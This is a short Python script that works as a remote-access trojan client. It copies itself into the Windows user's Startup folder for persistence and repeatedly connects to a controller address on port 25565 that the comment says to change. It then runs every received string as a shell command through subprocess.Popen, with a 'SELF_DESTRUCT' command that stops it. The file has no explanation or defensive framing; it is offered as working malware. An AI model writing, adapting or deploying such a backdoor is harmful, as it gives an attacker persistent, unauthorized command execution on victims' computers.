import socket 
import threading
import subprocess 
import sys, os, getpass
from shutil import copy
class Client:
        
    def build(self):
        try:
            self.add_startup()
        except Exception as e:
            print(e)
        self.connect()
        threading.Thread(target=self.listen).start()
    def connect(self):
        while True:
            try:
                print("Reaching out")
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                #CHANGE THE IP!
                
                self.socket.connect((socket.gethostbyname(socket.gethostname()), 25565))
                break 
            except:
                continue 
    def add_startup(self):
        copy(__file__, f"C:/Users/{getpass.getuser()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")
        print("Added to StartUp!")
    def listen(self):
        while True:
            try:
                self.data = self.socket.recv(2048).decode()
            except:
                self.socket.close()
                print("Reconnecting")
                self.connect()
                print("Reconnected!")
            if self.data == "SELF_DESTRUCT":
                sys.exit(0)
            subprocess.Popen(self.data, shell=True)
          
Client().build()
